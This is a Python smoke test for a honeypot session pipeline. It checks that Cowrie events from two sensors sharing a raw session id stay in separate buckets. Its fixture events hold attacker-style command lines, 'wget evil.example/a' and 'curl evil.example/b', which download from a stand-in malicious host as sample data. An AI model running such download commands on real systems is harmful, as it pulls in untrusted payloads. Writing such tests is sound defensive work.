"""Multi-sensor session read-path collision guard (release-readiness P1-2).

Cowrie session ids are only unique per-sensor. The rollup *write* side already
namespaces `_id` as `<sensor>:<session_id>` (`_session_uid`, see
`smoke_test_session_uid.py`), but until this fix the *read* side
(`_fetch_session_events`) bucketed fetched events by raw `session_id` alone —
so if sensor A and sensor B both emit a session with the same instance-local
id, the ES `terms` query (which can only filter on the raw field) returns both
sensors' events, and they'd merge into a single bucket and get built into one
corrupted session doc mixing two sensors' commands/credentials/classification.

`_fetch_session_events` now buckets by (observer.name, session_id) read off
each hit's own `_source`, keyed against the *requested* (sensor, session_id)
pairs — so a same-raw-id collision across sensors can never merge.

Standalone — no real ES: a fake client's `.search()` returns every canned hit
regardless of the query filter (worst case: simulates ES actually returning
both sensors' events for one `terms: {cowrie.session_id: [...]}` query, since
that field alone can't disambiguate sensors).

Run from the repo root via the console venv:
    /home/styx/git/dshield_prism/console/.venv/bin/python \\
      scripts/smoke/smoke_test_session_multi_sensor.py
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src"))

from enrich.sources.cowrie.sessions import _DEFAULT_SENSOR, _fetch_session_events

PASSED: list[str] = []
FAILED: list[tuple[str, str]] = []


def check(name: str, ok: bool, detail: str = "") -> None:
    if ok:
        PASSED.append(name)
        print(f"  PASS  {name}")
    else:
        FAILED.append((name, detail))
        print(f"  FAIL  {name}  {detail}")


class _FakeES:
    """Returns every canned hit on the first search() call, empty thereafter —
    emulating ES matching a `terms: {cowrie.session_id: [...]}` query across
    sensors, since that field can't disambiguate sensors on its own."""

    def __init__(self, hits: list[dict]):
        self._hits = hits
        self._served = False

    def search(self, index=None, **body):
        if self._served:
            return {"hits": {"hits": []}}
        self._served = True
        return {"hits": {"hits": [
            {"_source": h, "sort": [i]} for i, h in enumerate(self._hits)
        ]}}


RAW_SID = "abcd1234"  # same instance-local id on both sensors


def _event(sensor: str, cmd: str) -> dict:
    return {
        "@timestamp": "2026-08-20T00:00:00Z",
        "event": {"action": "cowrie.command.input"},
        "observer": {"name": sensor},
        "cowrie": {"session_id": RAW_SID},
        "process": {"command_line": cmd},
    }


# -----------------------------------------------------------------------------
# [1] Both sensors requested → each gets only its own events, none of the
# other's, even though the fake ES returns both in one page (the collision
# scenario this fix exists to prevent).
# -----------------------------------------------------------------------------
print("\n[1] same raw session_id on two sensors: no cross-sensor merge")
hits = [
    _event("sensor-a", "wget evil.example/a"),
    _event("sensor-b", "curl evil.example/b"),
]
es = _FakeES(hits)
result = _fetch_session_events(es, "events-idx", [("sensor-a", RAW_SID), ("sensor-b", RAW_SID)])

key_a = ("sensor-a", RAW_SID)
key_b = ("sensor-b", RAW_SID)
check("both keys present", set(result.keys()) == {key_a, key_b}, f"got {list(result.keys())}")
check("sensor-a bucket has only its own event",
      [e["process"]["command_line"] for e in result[key_a]] == ["wget evil.example/a"],
      f"got {result[key_a]!r}")
check("sensor-b bucket has only its own event",
      [e["process"]["command_line"] for e in result[key_b]] == ["curl evil.example/b"],
      f"got {result[key_b]!r}")


# -----------------------------------------------------------------------------
# [2] Only sensor-a requested (a different batch owns sensor-b's pair) →
# sensor-b's event must not leak into this batch's result at all, even though
# the fake ES still returned it.
# -----------------------------------------------------------------------------
print("\n[2] unrequested sensor's colliding event is dropped, not merged in")
es2 = _FakeES(hits)
result2 = _fetch_session_events(es2, "events-idx", [("sensor-a", RAW_SID)])
check("only the requested key present", set(result2.keys()) == {key_a}, f"got {list(result2.keys())}")
check("sensor-a bucket unpolluted by sensor-b's event",
      [e["process"]["command_line"] for e in result2[key_a]] == ["wget evil.example/a"],
      f"got {result2[key_a]!r}")


# -----------------------------------------------------------------------------
# [3] Unset sensor (None / falsy) normalizes to _DEFAULT_SENSOR, matching
# `_session_uid`'s write-side fallback.
# -----------------------------------------------------------------------------
print("\n[3] unset sensor normalizes to _DEFAULT_SENSOR")
unset_hit = {
    "@timestamp": "2026-08-20T00:00:00Z",
    "event": {"action": "cowrie.command.input"},
    "observer": {},
    "cowrie": {"session_id": "zzz9999"},
    "process": {"command_line": "id"},
}
es3 = _FakeES([unset_hit])
result3 = _fetch_session_events(es3, "events-idx", [(None, "zzz9999")])
check("None-sensor request key normalizes",
      list(result3.keys()) == [(_DEFAULT_SENSOR, "zzz9999")], f"got {list(result3.keys())}")
check("event lands in the default-sensor bucket",
      len(result3[(_DEFAULT_SENSOR, "zzz9999")]) == 1)


# -----------------------------------------------------------------------------
# Summary
# -----------------------------------------------------------------------------
print()
print(f"=== {len(PASSED)} passed, {len(FAILED)} failed ===")
if FAILED:
    for name, detail in FAILED:
        print(f"  - {name}: {detail}")
    sys.exit(1)
sys.exit(0)
